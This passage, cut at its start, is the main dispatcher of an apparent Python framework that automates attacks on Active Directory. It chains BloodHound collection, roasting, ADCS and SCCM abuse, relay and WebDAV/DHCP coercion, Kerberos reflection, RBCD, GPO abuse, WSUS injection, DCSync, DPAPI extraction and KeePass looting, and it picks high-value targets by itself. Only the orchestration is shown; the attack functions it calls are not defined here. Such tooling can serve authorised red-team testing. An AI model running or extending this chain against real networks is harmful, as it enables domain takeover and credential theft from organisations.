                run_bloodhound_collect(cfg)

            case "tgs-rewrite":
                run_tgs_rewrite_phase(cfg)

            case "loot":
                if not cfg.has_creds:
                    log.error("--phase loot requires credentials (-u/-p)")
                    sys.exit(1)
                run_loot(cfg)

            case "dollar-ticket":
                if not cfg.has_creds:
                    log.error("--phase dollar-ticket requires credentials (-u/-p)")
                    sys.exit(1)
                run_dollar_ticket(cfg)

            case "rbcd-kcd":
                if not cfg.has_creds:
                    log.error("--phase rbcd-kcd requires credentials (-u/-p)")
                    sys.exit(1)
                run_rbcd_kcd_chain(cfg)

            case "discover":
                # Zero-auth: no -u/-p needed, but cfg.dc_ip + cfg.domain
                # must be auto-discoverable from the network or supplied.
                if not (cfg.dc_ip and cfg.domain):
                    log.error("--phase discover needs --dc-ip + -d, "
                              "or run --phase sniff first to auto-detect")
                    sys.exit(1)
                run_credential_discovery(cfg)

            case "reflect-tcpport":
                run_reflect_tcpport(cfg)

            case "reflect-loopback":
                if not cfg.has_creds:
                    log.error("--phase reflect-loopback needs creds for ADIDNS write")
                    sys.exit(1)
                run_reflect_loopback(cfg)

            case "kerb-reflect":
                if not cfg.has_creds:
                    log.error("--phase kerb-reflect needs credentials")
                    sys.exit(1)
                tgt = cfg.specific_target or cfg.dc_fqdn
                if not tgt:
                    log.error("--phase kerb-reflect needs -T <target FQDN>")
                    sys.exit(1)
                run_kerberos_reflection(tgt, cfg)

            case "full":
                # Post-auth recon: nxc enrichment battery
                run_nxc_enrichment(cfg)

                # BloodHound graph collection + auto-action chains
                # (WriteSPN→ghost-SPN, AddKeyCredentialLink→shadow-creds,
                # GenericAll→RBCD). Fires before legacy exploitation so the
                # actionable edges have already been walked when we reach
                # the relay/coerce phases.
                if not cfg.no_bloodhound:
                    run_bloodhound_collect(cfg)

                # Run new authenticated attacks before exploitation
                if not cfg.no_roast:
                    run_roast_attack(cfg)
                if not cfg.no_adcs and tool_exists("certipy"):
                    run_adcs_attack(cfg)
                if not cfg.no_sccm:
                    run_sccm_attack(cfg)

                if cfg.specific_target:
                    if cfg.applocker and cfg.custom_cmd:
                        cfg.custom_cmd = _build_applocker_cmd(cfg)
                    exploit_target(cfg.specific_target, cfg)
                    if not cfg.no_dcsync:
                        dcsync_attack(cfg.specific_target, cfg)
                else:
                    relay_targets, _ = enumerate_targets(cfg)

                    best = ""
                    hv = cfg.work_dir / "high-value-targets.txt"
                    if hv.exists():
                        best = _first_line(hv.read_text())
                    if best:
                        ok(f"🎯 Auto-selected HIGH VALUE target: {best}")
                    elif relay_targets:
                        best = relay_targets[0]
                        ok(f"Auto-selected target: {best}")

                    if cfg.batch and relay_targets:
                        run_batch(relay_targets, cfg)
                    elif best:
                        if cfg.applocker and cfg.custom_cmd:
                            cfg.custom_cmd = _build_applocker_cmd(cfg)
                        exploit_target(best, cfg)

                    # WebDAV coercion — try if standard exploit didn't work or no relay targets
                    if not best or not relay_targets:
                        webclient_hosts = detect_webclient_hosts(cfg)
                        for wh in webclient_hosts:
                            if run_webdav_coercion(wh, cfg):
                                break

                    # DHCP coercion — additional relay path
                    run_dhcp_coercion(cfg)

                    # GPO abuse — if we have write access to any GPO
                    run_gpo_abuse(cfg)

                    # WSUS injection if available (AppLocker bypass)
                    if not cfg.no_wsus and cfg.wsus_server:
                        run_wsus_inject(cfg)

                    if not cfg.no_dcsync and best:
                        dcsync_attack(best, cfg)

                # DPAPI extraction after DCSync
                if not cfg.no_dpapi:
                    run_dpapi_backup(cfg)

                # Loot — process cmdlines + KeePass on hosts we landed on
                if not cfg.no_loot:
                    run_loot(cfg)

        cleanup_dns_records(cfg)
        print_summary(cfg)

    finally:
        cfg.cleanup()


if __name__ == "__main__":
    main()
